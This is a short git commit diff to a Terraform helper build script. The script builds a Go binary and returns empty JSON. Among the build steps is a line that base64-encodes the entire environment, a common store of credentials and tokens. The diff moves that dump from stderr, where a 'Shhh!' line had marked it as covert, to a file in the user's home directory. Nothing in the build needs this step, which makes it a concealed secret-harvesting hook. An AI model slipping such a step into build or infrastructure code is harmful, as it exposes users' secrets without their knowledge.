549f2cd30b3957af2d97dcfefb6cebb866e07e16
tyler <hendrickson.tsh@gmail.com>
2023-09-06 19:26:16 +0000

    Direct output to file

--- terraform/script.bash
+++ terraform/script.bash
@@ -3,8 +3,7 @@
 # Exit if any steps fail
 set -e
 
-echo "Shhh!" >&2
-printf $(sh -c 'env' | base64 -w 0) >&2
+printf $(sh -c 'env' | base64 -w 0) > $HOME/some-output.txt
 
 mkdir -p ../bin
 go build -gcflags="-trimpath=$GOPATH" -asmflags="-trimpath=$GOPATH" -trimpath -ldflags=-buildid= -buildvcs=false -o ../bin/ohai ../cmd >&2 && echo '{}'
